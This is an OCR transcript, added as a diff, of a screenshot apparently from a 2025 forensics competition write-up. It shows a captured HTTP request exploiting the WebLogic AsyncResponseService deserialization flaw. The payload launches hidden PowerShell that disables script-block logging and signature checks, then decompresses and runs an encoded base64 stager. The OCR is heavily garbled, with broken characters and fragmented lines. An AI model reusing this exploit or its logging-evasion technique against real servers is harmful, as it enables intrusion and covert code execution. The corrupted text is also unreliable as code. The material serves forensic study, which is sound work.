@@ -1,0 +1,107 @@
+# OCR: ab1964d8333ac7f2249020dc325af805.webp
+# 来源: ./02-WriteUp/2025/2025-数证杯-决赛团队赛/ab1964d8333ac7f2249020dc325af805.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:28
+
+PosT/_async/AsyncResponseServiceHTTP/1.1 Host:192.168.111.80:7091
+User-Agent:Mozi1la/5.0(iPad:CPU0s16_51ikeMac0sX)AppleWebKit/605.1.15(KHTML,1ikeGecko)Version/16.5Mobile/15E148Safari/6e4.1 SoAPAction:
+Content-Type:text/xml Content-Length:5297
+Ksoapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:wsa="http://www.w3.org/2oe5/o8/addressing"xmlns:asy="http://www.bea.com/ async/AsyncResponseService"><soapenv:Header><wsa:Action>5egJo5ukQF1jIAtowN7G</wsa:Action><wsa:RelatesTo>JUAbTug8OguNvtUrQe89</wsa:RelatesTo><work:WorkCon text xmlns:work="http://bea.com/2eo4/o6/soap/workarea/">void class="java.lang.ProcessBuilder"><array class="java.lang.String"length="3"><void index="o" ><string>cmd.exe</string></void><void index="1"><string>/c</string></void><void index="2"><string>powershell.exe -nop -whidden -noni -c"if([IntPtr]::si ze-eg4){$b='powershell.exe'elsef$b=$env:windir+'lsyswow64lwindowsPowershelllvl.olpowershell.exe';$s=New-objectSystem.Diagnostics.ProcessStartInfo;$s
+.FileName=sb;$s.Arguments='-noni-nop-whidden-c$re2jX=(('{e)n(1}ble'
+$PsVersionTable.Psver
+S
+upPoli
+CeTT
+s
+j40):$nbn
+HKEY
+-ge3)f$n6=Ref1.Assembly.GetType(
+on.Ma1or
+:$avbv=(
+Ta
+Sc31p3
+orystem.
+07cf17ipf21BlockLo
+$aVg=Collections.Generic.Dictionaryst
+CH
+:$i4=（5na21
+($eLeRx)
+NonPublig
+f$eLeRx.GetField(
+e
+SF
+ogging
+SeR
+XERe
+ation
+r);If(
+3t+i5s
+$xocB7=$n6.GetField(1cachedGro
+SemD
++--1!
+y.GetType((
+MS
+*6ti'+3+
+lockInvocat''+'ionLogg
+2731
+.SetValue($null,$true);:If（$xocB7)
+{$nbn=$xoCB7.GetValue($null);$aVg.Add($re2jx,0);$aVg.Add($
+LMACHINE]Software|Policies\Microsoft]windows|PowerShell]''+$aVbV]=$aVg;If($nbn[$aVbV])$nbn[$aVbVi[$re2jx]=o;$nbn[$aVbV][$j4]=
+g:t7Else
+fFRef.Assembly.GetTvpe(((s
+.GetField(i'signatures
+vf1tem.e+anaf!
++
+5
+Tement.A!
+"3}tomatio''+''n.Scf2}iptBloc'
++
+NonPublic,Static'').SetValue($null,(New-ObjectCollections.Generic.Hashset[string]));};&amp;([scriptbl
+ock]::create((New-ObjectSystem.Io.StreamReader(New-ObjectSystem.Io.Compression.GzipStream((New-ObjectSystem.Io.MemoryStream(,[System.Convert]::FromBas
+e64string（
+（1"H4sIABLV8GgCA7VX/W/iOBP1
+JGklzY3CpaWSqc9HrpebNwQrWG9EmSl
+「7H6ITEkFLgQDbbVda6XWA8LFJgCYQPg69Co1JDE7(2)JU6Bvbv//cYB2u677b17J6e1V2}eeGY+feWbG3WSxXwmLpezDeJB+//kn6TJGbu
+2i/b7PIJfHg48dw1i04
++''5ufvShdz1KY4w1ocU7kk/SE5IU7wzXc9xf1}6XfpcK/61oKVu79cJ2arleiKUbFPtiT2eeKzyrwHtKuFz89ddiaXmjrCa
+d3zKXpnL(17qUc1)xWfemJJ+r(2)kDr(1}PeywXDeI1LGUbXnFI3KhXJnHqbrAJ1h6xgXnI/LQI13m+
+sTnwwkzzvG5cNN-17wizk+wlo92JzwooDlgvVf+T15f
+SHLOYKWpV+zHHC9hZOH
+OmH00rPjX2KH/B''+''mBVoWT0gcrEo1EHtkOywX4ozSsV{1}Pz{2}gmP1yX+141+aUSSI14UipDTF+5p8H8jOKzZvEV(1}3{2)e1GBcuAD4/Skg3Fz5k6yVJH2FQ{2}8L17H(2)dzD4LI9YSnLtT1KtL
+BlwustZcoLPgp1kuL{1)6Qlwg7PrtYf17rs1XVVDckzGsLKe(2}+Ktn/a8IUPCstSuE3
+ZzG29IiNun2I2Id2ws/FpU8
+IbiHJPKVcwEB+XiZQP7bUxx4HKBsyDHN2qdiPAnXTUj1{2cJ8i
+Cy'+'KXgFQS997cw5dHKxHxs4AvT038DWwgbyBF+1L71xup4uvkGo2KJumpa1UQaJ6pU1c7sU+2UJxSm5bKG{2)s3xafHbXyCgnnpVyg71V6X/gvBzbYnHKk8yDuAIEtrXHHnGpQKQs9YiP1ZNFguVx
+xVfXaLmUOy6ApUeIB6wIHCy
+KA
+K4wKE1LFLdFN82z8VG/aU6JC
+s1ho7YD/IToDnOiciigf2
+ego
+ShUL8360pzgCmbxWaNQNoExcsiSnlxtgV/iGo9dkODNfIHOF5IWbEG6Lf216WpiThUIYEysCvf+XEt/Un96aV4Et5GuSLdUTFe1o2GdImOm'+''eXkDKIu
++EY96PgeEPdkTpH+BnwG/S/uB/HiB++tzuVO2y1Y662h9ih+Dg3ZnI8wc+vremTw51+rw1Or9xganN9FNrdi4P5k0JAuSb49CitVEn9s1tegweeo6wdbbhNZu9wO01
+rw+r
++
+tNJicHX2>7/tDvBXWztQvG（2}/Ww7k5nC
+1/zF1fupp'
+OzaD2snbg2cGiy2tTcicNS63ber1ar977bfU99pDK/
+N3+sDsnhep1erU8Lk9UUx78o60xD1t5/7wdY7p3LpT9c0KPmv+fh09PPoNI7DpODBs1Br
+egu7Pxo2kbDX1r1PutULe0B9NuHYJ11yYLS+0tHDNZn0CnHp7WdYXgXzpHs9U8wHmZ0VLtubf21IvWi3bKf27z3S10d0fDHsN+8zhs97/o28kf17dYPba
++amzNtyD7d7hIYkEXf17655ibxfws0cp1iTs0izN11vTHDva0Jxo+277yb13Hof
+W
++T3XFoTVsHUxsYk4Y50e0dmnTDGV1Uu9V7Z3C
+JkNowEINsFJ/+"8exptk6nV/A
+B7jhvsNzmGy'+''oLp4/kcA64QZoXrkn7ngJDbsQ8mbleVyb3SxKEhfHN3Kk2}gTLoBQh2EJvVwvtdGFOyBneHgVeIzJCKimY6rfnYI1gvKfIZ8452uHnptYf/9dNuevQu
+GPYncVW+02kPx64OwD/VLt
+6P/n9c2TCckJi3givchtmin7x89+
+FZDx/kOxVtUPDTdLOpZAkoOeu5UpiiXZpXSNGhIYs50+gHU5iTOHVAO+
++Yhj27g(17v0/Uh4
++Ka5YiSpknOue5vUHbPidTedsn/dyr12y
+16Umw9NxSr0sfPy7ATVE/{1}FJXdBwHPCzXjo1aDXph7Vhr5jXi+2/XYvuTfLZWFu1UwPNknubmwSLZSLL84yGDdxOH8v03oL2FHxy+g3IL9f9cAwWKKmP0JYbnqz0x4isEAToFb''+''r8'+'UjybB
+FTBWg3+TC1w8KF4+UA
+opOsT7H0ugSzEP4Y//fwn0vPY3u99Fqlo517+ib1a8XXjTCHwiB4xIokhY0
+"JYrPT6U3kLhkzYsw5xGCnNhchVgvYpjxGxNepXlv/AsVF52TvwwAAAfe)fe)-f
+"M)))),[System.Io.Compression.CompressionModel::Decompress))).ReadToEnd())';$s.UseshellExecute=sfalse;$s.Redirectstandardoutput=strue;$s
+Windowstyle='Hidden';$s.CreateNowindow=strue;$p=[System.Diagnostics.Processl::start($s);"</string></void></array><voidmethod="start"/></void></work:Work
+Context></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope> HTTP/1.12o2Accepted
+Date:Thu,160ct202511:20:49GMT Content-Length:0
+X-Powered-By:Servlet/2.5JSP/2.1
